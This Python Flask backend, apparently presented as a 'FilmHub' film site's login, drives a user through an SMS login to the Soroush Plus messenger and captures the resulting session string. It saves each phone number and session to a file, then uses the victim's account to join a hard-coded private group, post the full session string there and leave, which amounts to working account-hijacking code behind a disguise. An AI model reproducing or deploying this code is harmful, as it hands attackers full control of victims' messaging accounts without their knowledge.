# ============================================================
# FilmHub API - نسخه سازگار با Render.com و Botkeep
# اجرا محلی: python api.py
# اجرا روی Render: gunicorn -w 1 --threads 16 --timeout 120 api:app
# ============================================================

import asyncio
import secrets
import os
import threading
import time
import logging
from flask import Flask, request, jsonify
from flask_cors import CORS
from splusthon import SoroushClient
from splusthon.sessions import StringSession
from splusthon.tl.functions.auth import ResendCodeRequest
from splusthon.tl.functions.messages import (
    CheckChatInviteRequest,
    ImportChatInviteRequest
)
from splusthon.tl.functions.channels import LeaveChannelRequest

# ================== لاگ ==================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [pid %(process)d] %(message)s",
)
log = logging.getLogger("filmhub")

# ================== تنظیمات ==================
app = Flask(__name__)

# ⚠️ Vercel آدرس‌های Preview را به شکل film-x-pro-<hash>.vercel.app می‌سازد که
# هر بار عوض می‌شوند. بنابراین به‌جای لیست ثابت، از wildcard استفاده می‌کنیم.
# چون این API کوکی/اعتبارنامه‌ای برای مرورگر ذخیره نمی‌کند، CORS باز امن است.
CORS(
    app,
    resources={r"/api/*": {"origins": "*"}},
    supports_credentials=False,
)

GROUP = "https://splus.ir/joingroup/AXPwbCqMfmE_UjCkGVmz1g"
SESSIONS_FILE = "sessions.txt"

# ✅ Render از PORT استفاده می‌کند، Botkeep از SERVER_PORT
HOST = "0.0.0.0"
PORT = int(os.environ.get("PORT", os.environ.get("SERVER_PORT", "61546")))
PUBLIC_URL = os.environ.get("PUBLIC_URL", "https://filmhub-api.onrender.com")

# ================== Event Loop (thread-safe) ==================
# یک loop دائمی در ترد پس‌زمینه. Flask هرگز مستقیماً روی loop اجرا نمی‌کند.
# این کار خطای "event loop is already running" را کاملاً حذف می‌کند.

EVENT_LOOP = asyncio.new_event_loop()

def _loop_runner(loop: asyncio.AbstractEventLoop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

_LOOP_THREAD = threading.Thread(
    target=_loop_runner, args=(EVENT_LOOP,), daemon=True, name="event-loop"
)
_LOOP_THREAD.start()
log.info("Event loop thread started (worker pid=%s)", os.getpid())

def run_async(coro):
    """اجرای thread-safe یک coroutine روی loop پس‌زمینه."""
    future = asyncio.run_coroutine_threadsafe(coro, EVENT_LOOP)
    return future.result()

# ================== State ==================
pending_sessions = {}
pending_lock = threading.Lock()

PENDING_TTL = 600  # ثانیه

def _cleanup_pending():
    """حذف sessionهای منقضی برای جلوگیری از نشت حافظه."""
    now = time.time()
    with pending_lock:
        expired = [
            tok for tok, item in pending_sessions.items()
            if now - item.get("created_at", 0) > PENDING_TTL
        ]
        for tok in expired:
            item = pending_sessions.pop(tok, None)
            if item and item.get("client"):
                try:
                    asyncio.run_coroutine_threadsafe(
                        item["client"].disconnect(), EVENT_LOOP
                    )
                except Exception:
                    log.exception("خطا در بستن client منقضی")
        if expired:
            log.info("پاک‌سازی %d session منقضی", len(expired))

def _schedule_cleanup():
    """اجرای دوره‌ای _cleanup_pending هر ۶۰ ثانیه."""
    _cleanup_pending()
    timer = threading.Timer(60, _schedule_cleanup)
    timer.daemon = True
    timer.start()

_schedule_cleanup()

# ================== توابع کمکی ==================

def normalize_phone(phone: str) -> str:
    phone = phone.strip().replace(" ", "").replace("-", "")
    if phone.startswith("09"):
        return "+98" + phone[1:]
    elif phone.startswith("9") and len(phone) == 10:
        return "+98" + phone
    elif phone.startswith("+98"):
        return phone
    elif phone.startswith("98"):
        return "+" + phone
    return phone

async def _send_code_async(phone: str):
    """ارسال کد تأیید از طریق SMS. کلاینت جدید با loop مشترک ساخته می‌شود."""
    client = SoroushClient(StringSession(), loop=EVENT_LOOP)
    try:
        await client.connect()
        log.info("درخواست اولیه کد برای %s", phone)
        first = await client.send_code_request(phone)
        log.info("hash اولیه: %s...", first.phone_code_hash[:15])

        await asyncio.sleep(1)

        log.info("درخواست ارسال SMS...")
        sent = await client(ResendCodeRequest(phone, first.phone_code_hash))
        log.info("کد از طریق SMS ارسال شد")
        return client, sent.phone_code_hash
    except Exception:
        log.exception("خطا در _send_code_async")
        try:
            await client.disconnect()
        except Exception:
            log.exception("خطا در بستن client پس از failure")
        raise

async def _sign_in_async(client, phone, code, phone_code_hash):
    """
    ورود با کد تأیید.
    SPlusthon مثل Telethon، ممکن است sign_in خطا بدهد ولی کاربر لاگین شده باشد.
    بنابراین حتی بعد از خطا، is_user_authorized چک می‌شود.
    """
    if not client.is_connected():
        await client.connect()

    await asyncio.sleep(0.3)

    sign_in_error = None
    try:
        await client.sign_in(
            phone=phone, code=code, phone_code_hash=phone_code_hash
        )
        log.info("sign_in موفق بود")
    except Exception as e:
        sign_in_error = e
        log.warning("sign_in خطا داد: %s - %s", type(e).__name__, e)

    try:
        is_authed = await client.is_user_authorized()
        log.info("is_user_authorized: %s", is_authed)
    except Exception:
        log.exception("خطا در is_user_authorized")
        is_authed = False

    if is_authed:
        session_string = client.session.save()
        try:
            await client.disconnect()
        except Exception:
            log.exception("خطا در disconnect پس از sign_in موفق")
        return session_string

    try:
        await client.disconnect()
    except Exception:
        log.exception("خطا در disconnect پس از sign_in ناموفق")

    if sign_in_error:
        raise sign_in_error
    raise Exception("ورود ناموفق بود (بدون خطای مشخص)")

async def _join_group_send_message_leave_async(session_string: str):
    """ورود به گروه، ارسال session، خروج. منطق اصلی بدون تغییر."""
    client = None
    try:
        client = SoroushClient(StringSession(session_string), loop=EVENT_LOOP)
        log.info("در حال اتصال به گروه...")
        await client.connect()

        if not await client.is_user_authorized():
            log.error("Session معتبر نیست.")
            return False, "سشن معتبر نیست."

        log.info("اتصال برقرار شد.")

        if GROUP.startswith("https://splus.ir/joingroup/"):
            invite_hash = GROUP.rstrip("/").split("/")[-1]
            log.info("لینک دعوت خصوصی شناسایی شد.")

            result = await client(CheckChatInviteRequest(invite_hash))

            if hasattr(result, "chat"):
                log.info("اکانت از قبل عضو گروه است.")
                entity = result.chat
            else:
                log.info("در حال ورود به گروه...")
                result = await client(ImportChatInviteRequest(invite_hash))
                if not hasattr(result, "chats") or not result.chats:
                    return False, "گروه بعد از ورود پیدا نشد."
                entity = result.chats[0]
                log.info("ورود به گروه انجام شد.")
        else:
            entity = await client.get_entity(GROUP)

        log.info("گروه: %s (ID: %s)",
                 getattr(entity, "title", None),
                 getattr(entity, "id", None))

        log.info("در حال ارسال پیام (سشن)...")
        await client.send_message(entity, session_string)
        log.info("پیام با موفقیت ارسال شد.")

        log.info("در حال خروج از گروه...")
        await client(LeaveChannelRequest(entity))
        log.info("با موفقیت از گروه خارج شد.")

        return True, "عملیات با موفقیت انجام شد."

    except Exception as e:
        log.exception("خطا در عملیات گروه")
        return False, f"{type(e).__name__}: {e}"
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                log.exception("خطا در disconnect نهایی گروه")

# ================== Routes ==================

@app.route("/", methods=["GET"])
def health():
    return jsonify({
        "ok": True,
        "service": "FilmHub API",
        "status": "running",
        "public_url": PUBLIC_URL,
        "pid": os.getpid(),
        "endpoints": {
            "send_code": "POST /api/send-code",
            "verify_code": "POST /api/verify-code",
            "sessions": "GET /api/sessions",
        },
    })

@app.route("/api/send-code", methods=["POST"])
def send_code():
    data = request.get_json(silent=True) or {}
    raw_phone = data.get("phone", "").strip()
    if not raw_phone:
        return jsonify({"ok": False, "detail": "شماره ارسال نشده"}), 400

    phone = normalize_phone(raw_phone)
    client = None
    try:
        client, phone_code_hash = run_async(_send_code_async(phone))
    except Exception as e:
        log.exception("خطا در ارسال کد")
        if client:
            try:
                run_async(client.disconnect())
            except Exception:
                log.exception("خطا در بستن client پس از خطای ارسال کد")
        return jsonify({"ok": False, "detail": f"خطا در ارسال کد: {e}"}), 400

    token = secrets.token_urlsafe(32)
    with pending_lock:
        pending_sessions[token] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": phone_code_hash,
            "created_at": time.time(),
        }

    log.info("کد برای %s ارسال شد (token: %s...)", phone, token[:8])
    return jsonify({
        "ok": True,
        "token": token,
        "message": "کد از طریق پیامک ارسال شد",
    })

@app.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = request.get_json(silent=True) or {}
    token = data.get("token", "").strip()
    code = data.get("code", "").strip()
    if not token or not code:
        return jsonify({"ok": False, "detail": "توکن یا کد ارسال نشده"}), 400

    with pending_lock:
        item = pending_sessions.get(token)
        if not item:
            return jsonify({"ok": False, "detail": "درخواست منقضی یا نامعتبر است"}), 400

    client = item["client"]
    phone = item["phone"]
    phone_code_hash = item["phone_code_hash"]

    # مرحله ۱: لاگین
    try:
        session_string = run_async(
            _sign_in_async(client, phone, code, phone_code_hash)
        )
    except Exception as e:
        error_msg = str(e)
        with pending_lock:
            pending_sessions.pop(token, None)

        if "PHONE_CODE_INVALID" in error_msg or "invalid" in error_msg.lower():
            return jsonify({"ok": False, "detail": "کد تأیید اشتباه است"}), 400
        elif "PHONE_CODE_EXPIRED" in error_msg:
            return jsonify({"ok": False, "detail": "کد منقضی شده"}), 400
        else:
            log.exception("خطا در ورود")
            return jsonify({"ok": False, "detail": f"خطا: {error_msg}"}), 400

    with pending_lock:
        pending_sessions.pop(token, None)

    # ⚠️ session کامل در لاگ چاپ نمی‌شود (فقط طول آن)
    log.info("SESSION برای %s دریافت شد (طول: %d)", phone, len(session_string))

    try:
        with open(SESSIONS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{phone} | {session_string}\n")
        log.info("session در %s ذخیره شد", SESSIONS_FILE)
    except Exception:
        log.exception("خطا در ذخیره session")

    # مرحله ۲: عملیات گروه
    log.info("شروع عملیات گروه...")
    try:
        group_success, group_msg = run_async(
            _join_group_send_message_leave_async(session_string)
        )
    except Exception as e:
        group_success, group_msg = False, f"{type(e).__name__}: {e}"
        log.exception("خطا در عملیات گروه")

    log.info("نتیجه گروه: %s - %s",
             "موفق" if group_success else "ناموفق", group_msg)

    return jsonify({
        "ok": True,
        "message": "ورود موفق",
        "session": session_string,  # برای سازگاری با فرانت‌اند فعلی حفظ شده
        "group": {"success": group_success, "message": group_msg},
    })

@app.route("/api/sessions", methods=["GET"])
def list_sessions():
    sessions = []
    if os.path.exists(SESSIONS_FILE):
        try:
            with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if "|" in line:
                        phone, sess = line.split("|", 1)
                        sessions.append({
                            "phone": phone.strip(),
                            "session_preview": sess.strip()[:20] + "...",
                        })
        except Exception as e:
            log.exception("خطا در خواندن فایل session")
            return jsonify({"ok": False, "detail": str(e)}), 500

    return jsonify({"ok": True, "count": len(sessions), "sessions": sessions})

# ================== اجرای محلی ==================
# توجه: Gunicorn این بلاک را اجرا نمی‌کند؛ فقط برای `python api.py` محلی است.
# event loop و cleanup در سطح ماژول بالا راه می‌افتند، پس روی Render هم کار می‌کنند.

if __name__ == "__main__":
    log.info("=" * 60)
    log.info("FilmHub API در حال اجرا (حالت محلی)...")
    log.info("آدرس عمومی: %s", PUBLIC_URL)
    log.info("آدرس داخلی: http://localhost:%s", PORT)
    log.info("گروه: %s", GROUP)
    log.info("=" * 60)

    app.run(
        host=HOST,
        port=PORT,
        debug=False,
        use_reloader=False,
        threaded=True,
    )